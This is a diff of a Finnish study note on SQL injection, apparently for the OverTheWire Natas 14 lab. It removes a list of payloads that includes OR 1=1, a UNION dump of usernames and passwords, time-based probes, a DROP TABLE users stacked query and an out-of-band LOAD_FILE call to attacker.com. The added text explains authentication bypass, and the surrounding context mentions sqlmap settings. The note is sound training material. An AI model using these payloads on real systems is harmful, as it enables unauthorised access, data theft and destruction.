@@ -55,85 +55,6 @@ Täysin mahdollista, että tässä URL:ssa on SQL-injektio-aukko, ja "alice" voi
 
 Jos palvelin ei ole suojattu kunnolla, se voi altistua SQL-injektiolle ja paljastaa tietoja tai jopa antaa mahdollisuuden kirjautua sisään ilman oikeaa salasanaa.
 
-## SQL Injektio - Whitehat
-**white hat -testaajat** (eli eettiset hakkeroijat, penetraatiotestaajat jne.) käyttävät hyvin usein juuri tuollaista SQL-injektiorakennetta testatessaan, onko verkkosovellus altis SQL-injektiolle.
-
-**Klassinen SQL-injektio:** <br><br>
-Jos lomake tai URL-parametrit välitetään suoraan SQL-kyselyyn ilman suojausta, kuten:<br>
-`SELECT * FROM users WHERE username = '[syöte]' AND password = '[syöte]';`
-
-password (syöte) siis joku satunnainen sana väliin <br>
-
-<br>
-Tällöin kyselystä tulee käytännössä: <br>
-
-`SELECT * FROM users WHERE username = '' OR 1=1 -- ' AND password = '';`
-
-<br>
-Mitä tämä tekee?<br>
-
-```
-' OR 1=1 --:
-' päättää alkuperäisen stringin.
-OR 1=1 on aina tosi, joten se ohittaa autentikoinnin.
--- on SQL-kommenttimerkki, joka kommentoi loput rivistä pois (eli AND password = ... jää huomiotta).
-```
-
-### SQL injektio muita menetelmiä 
-
-nykyaikainen white hat -testaus ja hyökkäystavat voivat käyttää monia eri tekniikoita riippuen sovelluksen rakenteesta, suojauksista ja tietokannasta.
-
-
-1. UNION SQL Injection <br>
-' UNION SELECT username, password FROM users --
-
-
-2. Tautology Injection (klassikko: OR 1=1) <br>
-' OR 1=1 --
-
-
-3. Blind SQL Injection (Boolean-based) <br>
-' AND 1=1 --   # toimii
-' AND 1=2 --   # ei toimi
-
-
-4. Time-based Blind SQL Injection <br>
-' OR IF(1=1, SLEEP(5), 0) -- 
-
-
-5. Error-based SQL Injection <br>
-' ORDER BY 100 -- 
-
-
-6. Stacked Queries (jos sallittu) <br>
-'; DROP TABLE users; --
-
-
-7. Second-order SQL Injection <br>
-Tätä ei suoriteta heti, vaan tallennetaan ensin ja suoritetaan myöhemmin toisessa yhteydessä. Eli ensin rekisteröidään käyttäjänimi ja sitten 
-
-
-8. Out-of-Band SQL Injection <br>
-Tämä vaatii erityisiä olosuhteita, ja SQL-injektio lähettää tiedon ulos järjestelmästä, esim. DNS-kyselynä: <br>
-' OR LOAD_FILE('\\\\attacker.com\\file') -- 
-
-
-
-9. Using SQL Comments Smartly <br>
--- (yksirivinen kommentti) <br>
-/* comment */ (monirivinen) <br>
-%23 (URL-koodattu #, MySQL-kommentti) <br>
-esim: `' OR 1=1 /*'`
-
-
-✅ Miten white hat testaa eri metodit? <br>
-- Kokeilee klassista: `' OR 1=1 --`
-- Testaa error-muotoja ja katsoo mitä virheilmoituksia tulee <br>
-- Testaa blind-injektiot jos mitään ei palaudu <br>
-- Vahvistaa että kyseessä on injektio testaamalla SLEEP, ORDER BY, jne. <br>
-- Käyttää automatisoituja työkaluja kuten sqlmap <br>
-
-
 ---
 
 # Level 14 - 2 - virallinen testi ja harjoitus - START HERE
@@ -307,8 +228,6 @@ Executing query: SELECT * from users where username="admin" and password="admin"
 </html>
 
 ```
-
-
 
 nyt tässä on syötettu url enkoodattuna toi **"admin"' OR 1=1 --"** muodosta sinne URL username ja password kentään
 
@@ -633,7 +552,11 @@ Table: users
 
 # SQL injektio mini huomio - START HERE 
 
-pieni huomiona tämä osuus:
+pieni huomiona tämä osuus - tämä taulukko toimii kuin pien lunttilappuna, usein kirjauttumisessa voi olla monen tyyppistä et pelkä käyttäjäjänimeä. Tätä taulukkon mukaista prosessia kutsutaan **SQL - injektion manipulointia, ei salasanojen arvaamista**  kuitenkin yritetään **muokata taustalla olevaa SQL-kyselyä esim. just syöttämällä noita erikoismerkkiä `"` tai `'` tai yhdistelmiä just `"' OR 1=1 --`. Tästä just ideana **testata onko oleva tietokanta haavoittuvainen syötteiden käsittylssä**. 
+
+Kun palvelin EI käsittele syötettä turvallisesti, hyökkääjä voi ohittaa autentikoinnin tai käskeä tietokantaa tekemään jotain muuta (kuten palauttamaan kaikki käyttäjät).
+
+
 
 | Kenttä     | Syöte / URL                      | Arvo (selkokielisenä)                 | Ero ja merkitys                                                                 |
 |------------|----------------------------------|----------------------------------------|----------------------------------------------------------------------------------|
@@ -718,7 +641,7 @@ Esim. tässä Natas 14 harjoituksessa: `http://natas14.natas.labs.overthewire.or
 
 ## SQLMAP komento
 
-tehokkuus ja laajuus säädetään sqlmapissa --level ja --risk -asetuksilla. Ne vaikuttavat siihen, kuinka aggressiivisesti ja syvällisesti sqlmap hyökkää.
+tehokkuus ja laajuus säädetään sqlmapissa `--level` ja `--risk` -asetuksilla. Ne vaikuttavat siihen, kuinka aggressiivisesti ja syvällisesti sqlmap hyökkää.
 
 Asetus	Merkitys
 --level=1-5	- Kuinka laajasti testataan parametreja (1 = nopea, 5 = kaikki mahdolliset)
